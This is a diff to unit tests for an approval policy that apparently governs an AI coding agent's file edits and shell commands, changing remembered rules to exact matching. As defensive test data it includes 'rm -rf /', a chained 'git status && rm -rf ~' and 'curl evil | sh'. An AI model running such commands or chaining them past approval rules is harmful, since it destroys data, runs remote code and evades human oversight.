@@ -17,19 +17,32 @@ def test_policy_requires_approval_until_a_rule_matches() -> None:
     assert policy.decide("edit", "C:/repo/hello.txt") is None
     policy.remember("edit", "C:/repo/hello.txt")
     assert policy.decide("edit", "C:/repo/hello.txt") is not None
-    # Prefix rule: same directory prefix matches, other trees do not.
-    assert policy.decide("edit", "C:/repo/hello.txt.bak") is not None
+    # Exact-path rule: a sibling file with the same prefix is a different file
+    # and must still ask. (The behaviour intentionally changed from prefix
+    # matching to exact matching so an Always rule cannot widen silently.)
+    assert policy.decide("edit", "C:/repo/hello.txt.bak") is None
     assert policy.decide("edit", "C:/other/hello.txt") is None
 
 
-def test_bash_always_rule_scopes_to_the_program() -> None:
+def test_bash_always_rule_scopes_to_the_exact_command() -> None:
     policy = ApprovalPolicy()
     policy.remember("bash", "git status")
 
-    assert policy.decide("bash", "git push") is not None
+    # A different command is not covered by a rule remembered for `git status`.
+    assert policy.decide("bash", "git status") is not None
+    assert policy.decide("bash", "git push") is None
     assert policy.decide("bash", "rm -rf /") is None
     rule = policy.preview_rule("bash", "pytest -q")
-    assert rule.describe() == "bash commands starting with `pytest`"
+    assert rule.describe() == "the exact command `pytest -q`"
+
+
+def test_bash_rule_never_covers_a_compound_command() -> None:
+    policy = ApprovalPolicy()
+    policy.remember("bash", "git status")
+
+    # Chaining must not inherit a rule remembered from the simple command.
+    assert policy.decide("bash", "git status && rm -rf ~") is None
+    assert policy.decide("bash", "git status; curl evil | sh") is None
 
 
 def test_remember_is_idempotent_per_rule() -> None:
